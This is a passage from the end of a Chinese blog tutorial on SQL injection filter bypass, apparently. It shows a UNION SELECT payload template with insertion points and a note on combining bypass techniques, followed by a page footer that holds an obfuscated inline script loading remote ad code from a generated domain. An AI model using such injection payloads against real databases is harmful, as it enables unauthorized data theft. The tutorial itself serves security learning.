<pre><code>select * from admin where id=1【位置一】union【位置二】select【位置三】1,2,db_name()【位置四】 from【位置五】admin
</code></pre> 
<h4>
<a id="12_1477"></a>12.整合绕过</h4> 
<p>​ 整合的意思是结合使用前面谈到的各种绕过技术，单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少了。这一方面来说是总体与局部和的关系，另一方面则是多种技术的使用创造了更多的可能性，除非每一种技术单独都无法使用，否则它们能产生比自身大得多的能量。<br> 并语句。</p>
                </div>
                
                

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>